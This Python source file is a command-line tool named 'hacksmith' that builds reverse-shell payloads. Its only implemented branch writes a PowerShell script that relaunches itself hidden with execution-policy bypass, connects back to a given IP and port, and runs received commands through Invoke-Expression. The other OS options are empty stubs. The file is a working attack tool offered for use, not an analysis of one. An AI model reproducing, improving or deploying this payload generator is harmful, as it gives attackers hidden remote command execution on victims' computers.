import argparse
import ipaddress
import sys
import socket


class Dozer:
    """
    tool
    """

    def __init__(self, ip: str, port: int, os: str) -> None:
        """
        initialization for hacksmith tool
        """
        if not self._check_ip(ip):
            self._error("invalid ip")
        self.ip = ip

        self.port = port
        self.os = os

    def create(self):
        print("creating tool")
        print("-------------")
        print(f"ip = {self.ip}")
        print(f"port = {self.port}")
        print(f"os = {self.os}")
        print("-------------")

        match self.os:
            case "windows":
                print("creating revshell for windows")
                self.windows_rev_shell()
            case "linux":
                print("creating revshell for linux")
            case "mac":
                print("creating revshell for mac")
            case "android":
                print("creating revshell for android")
            case "ios":
                print("creating revshell for ios")

        return

    def windows_rev_shell(self):
        ps_script = f"""\
# Check if script is running with the right args (hidden, no profile, bypass)
if (-not ($MyInvocation.InvocationName -like "*-nop*" -and $host.UI.RawUI.WindowTitle -eq "")) {{
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-nop -W hidden -noni -ep bypass -File `"$PSCommandPath`""
    $psi.WindowStyle = "Hidden"
    $psi.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    exit
}}

$TCPClient = New-Object Net.Sockets.TCPClient("{self.ip}", {self.port})
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteToStream ($String) {{
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}}
    $StreamWriter.Write($String + "DOZER_SHELL> ")
    $StreamWriter.Flush()
}}

WriteToStream ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {{
        Invoke-Expression $Command 2>&1 | Out-String
    }} catch {{
        $_ | Out-String
    }}
    WriteToStream ($Output)
}}

$StreamWriter.Close()
"""

        with open("win_shell.ps1", "w", encoding="utf-8") as f:
            f.write(ps_script)
            print("created wih_shell.ps1 file")

    def _check_ip(self, ip: str):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    def _error(self, err_message: str):
        print(err_message)
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        prog="hacksmith",
        description="tool for making rev shells across all devices",
        epilog="made by n0_sh4d3",
    )

    parser.add_argument("--ip", help="home ip address")
    parser.add_argument("--port", help="port number")
    parser.add_argument(
        "--os",
        help="target os",
        choices=[
            "windows",
            "linux",
            "mac",
            "android",
            "ios",
        ],
    )

    args = parser.parse_args()
    try:
        args.port = int(args.port)

    except ValueError:
        print("port must be an int")
        sys.exit(1)

    if args.port <= 1024:
        print("port cannot be lower than 1024")
    if args.port > 65535:
        print("port cannot be higher than 65535")

    tool = Dozer(ip=args.ip, port=args.port, os=args.os)
    tool.create()


if __name__ == "__main__":
    main()
